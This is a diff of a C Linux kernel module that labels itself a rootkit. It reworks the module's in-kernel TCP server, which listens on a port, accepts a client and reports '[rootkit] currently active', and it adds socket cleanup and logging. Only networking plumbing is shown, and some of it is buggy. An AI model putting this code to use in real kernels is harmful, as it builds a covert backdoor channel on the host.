@@ -31,16 +31,7 @@ struct server_t{
 };
 
 static int run_server(void *port){ //runs the server
-	struct server_t server; //holds data associated with server
 	int err; //int to hold error codes
-
-	// kernel memory allocate a send and recieve buffer
-	client.message = kmalloc(BUFFER_SIZE, GFP_KERNEL); //allocates memory
-	if (client.message == NULL) { //if message is null
-		printk(KERN_DEBUG "[rootkit] run_server- buffer kmalloc error!\n"); //prints debug info
-		return err; //returns -1 for error
-	}
-
 	server.port = (unsigned short int) port; //sets the server port
 
 	memset(&(server.s_addr), 0, sizeof(server.s_addr)); //zeroes out the sin_addr
@@ -51,18 +42,18 @@ static int run_server(void *port){ //runs the server
 	server.sock = (struct socket *)kmalloc(sizeof(struct socket), GFP_KERNEL); //allocates memory to the socket for server
 	if (server.sock == NULL) { //if message is null
 		printk(KERN_DEBUG "[rootkit] run_server- server.sock kmalloc error!\n"); //prints debug info
-		return err; //returns -1 for error
+		return -1; //returns -1 for error
 	}
 	client.sock = (struct socket *)kmalloc(sizeof(struct socket), GFP_KERNEL); //allocates memory to the socket for connection
 	if (client.sock == NULL) { //if message is null
 		printk(KERN_DEBUG "[rootkit] run_server- client.sock kmalloc error!\n"); //prints debug info
-		return err; //returns -1 for error
+		return -1; //returns -1 for error
 	}
 
 	err = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &(server.sock)); //creates socket for server
-	if (err < 0) { //if error creating socket
+	if (err){ //if error creating socket
 		printk(KERN_DEBUG "[rootkit] net_connect- server socket creation error!- %d\n", err); //print debug info
-		return -1; //returns -1 for error
+		return err; //returns -1 for error
 	}
 	err = server.sock->ops->bind(server.sock, (struct sockaddr *)&(server.s_addr), sizeof(server.s_addr)); //binds server
 	if (err<0){ //if error binding
@@ -82,6 +73,7 @@ static int run_server(void *port){ //runs the server
 			printk(KERN_DEBUG "[rootkit] run_server- server accept error!- %d\n", err); //prints debug info
 			return err; //returns -1 for error
 		}
+		printk("[rootkit] run_server- client accepted\n");
 		err = client_handler();
 		if (err<0){ //if error with handling
 			printk(KERN_DEBUG "[rootkit] run_server- client handle error!- %d\n", err); //prints debug info
@@ -90,6 +82,13 @@ static int run_server(void *port){ //runs the server
 	}
 	return 0; //return 0  for no errors
 }
+
+static int remove_server(void){ //removes the server
+	sock_release(client.sock);
+	sock_release(server.sock);
+	return 0;
+}
+
 static int net_send(void){ //sends data to the server
 	//  https://linux-kernel-labs.github.io/refs/heads/master/labs/networking.html
 	int err; //int to hold error codes
@@ -131,16 +130,20 @@ static int net_recv(void){ //recieves data from server
 	return 0; //return 0 for no errors
 }
 
-
 	/*========================*\
 		client interface
 	\*========================*/
 
 static int client_handler(void){
 	printk(KERN_DEBUG "[rootkit] in client_handler");
+
+	// kernel memory allocate a send and recieve buffer
+	client.message = kmalloc(BUFFER_SIZE, GFP_KERNEL); //allocates memory
 	if (client.message == NULL) { //if message is null
-		printk(KERN_DEBUG "[rootkit] client message is null!!!");
+		printk(KERN_DEBUG "[rootkit] run_server- buffer kmalloc error!\n"); //prints debug info
+		return -1; //returns -1 for error
 	}
+
 	memset(client.message, 0, sizeof(client.message)); //zeroescout message buffer
 	strcpy(client.message, "[rootkit] currently active"); //copies basic auth message into buffer
 	net_send();
